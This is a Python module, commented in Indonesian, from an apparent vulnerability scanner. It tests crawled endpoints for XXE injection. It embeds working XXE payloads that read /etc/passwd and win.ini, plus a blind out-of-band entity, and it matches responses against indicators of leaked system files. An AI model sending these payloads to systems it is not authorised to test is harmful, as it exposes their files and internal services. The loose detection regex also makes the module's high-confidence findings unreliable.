"""
AbyssForge - XXE (XML External Entity) Scanner
Deteksi XXE pada endpoint yang menerima XML.
Hanya boleh import dari core dan utils.
"""

import asyncio
import logging
import re
from typing import List

from core.config import ScanConfig
from core.finding import Finding
from core.http_client import AsyncHTTPClient
from core.crawler import CrawledURL
from utils.payload_loader import load_payloads

logger = logging.getLogger(__name__)
MODULE_NAME = "xxe"

# Tanda-tanda response mengandung file konten dari XXE
XXE_INDICATORS = [
    r"root:.*:0:0:",          # /etc/passwd Unix
    r"\[boot loader\]",       # boot.ini Windows
    r"<?xml",                 # Reflected XML
    r"SYSTEM",                # Entity leak
    r"file:///",              # File URI leak
]
_XXE_RE = re.compile("|".join(XXE_INDICATORS), re.IGNORECASE)

# Content-Type yang mengindikasikan XML diterima
XML_CONTENT_TYPES = [
    "text/xml",
    "application/xml",
    "application/soap+xml",
    "application/xhtml+xml",
]

XXE_PAYLOADS = [
    # Classic file read
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",

    # Windows
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>""",

    # Blind - OOB (tanpa callback nyata, untuk deteksi heuristik)
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/xxe-test">%xxe;]>
<root/>""",
]


def _detect_xml_endpoint(page: "CrawledURL") -> bool:
    """Periksa apakah halaman/endpoint menerima XML."""
    ct = page.content_type.lower()
    return any(xct in ct for xct in XML_CONTENT_TYPES)


async def _test_xxe(
    http: AsyncHTTPClient,
    url: str,
    payload: str,
) -> List[Finding]:
    findings = []
    try:
        resp = await http.post(
            url,
            data=payload.encode("utf-8"),
            headers={"Content-Type": "application/xml"},
        )
        if resp.error:
            return []

        if _XXE_RE.search(resp.text):
            m = _XXE_RE.search(resp.text)
            snippet = resp.text[max(0, m.start()-30):m.end()+200].strip()
            findings.append(Finding.from_cvss(
                cvss_score=9.1,
                title="XML External Entity (XXE) Injection",
                vuln_type=MODULE_NAME,
                url=url,
                method="POST",
                description=(
                    "Endpoint memproses XML dengan External Entity yang diaktifkan. "
                    "Attacker dapat membaca file sistem, melakukan SSRF, atau exfiltrate data."
                ),
                evidence=snippet,
                payload=payload[:300],
                remediation=(
                    "Nonaktifkan pemrosesan External Entity di parser XML. "
                    "Gunakan library XML yang aman (defusedxml untuk Python). "
                    "Validasi dan sanitasi input XML."
                ),
                references="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                module=MODULE_NAME,
                confidence="HIGH",
            ))
    except Exception as exc:
        logger.debug("XXE test error pada %s: %s", url, exc)

    return findings


async def scan(
    config: ScanConfig,
    http: AsyncHTTPClient,
    crawled: List[CrawledURL],
) -> List[Finding]:
    """Entry point modul XXE."""
    findings: List[Finding] = []
    tasks = []

    for page in crawled:
        # Test semua URL yang terlihat sebagai XML endpoint, atau URL dengan form POST
        is_xml = _detect_xml_endpoint(page)
        has_post_form = any(f["method"].upper() == "POST" for f in page.forms)

        if is_xml or has_post_form:
            for payload in XXE_PAYLOADS:
                tasks.append(_test_xxe(http, page.url, payload))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, list):
            findings.extend(r)

    # Deduplikasi per URL
    seen, unique = set(), []
    for f in findings:
        key = (f.url, f.title)
        if key not in seen:
            seen.add(key)
            unique.append(f)

    return unique
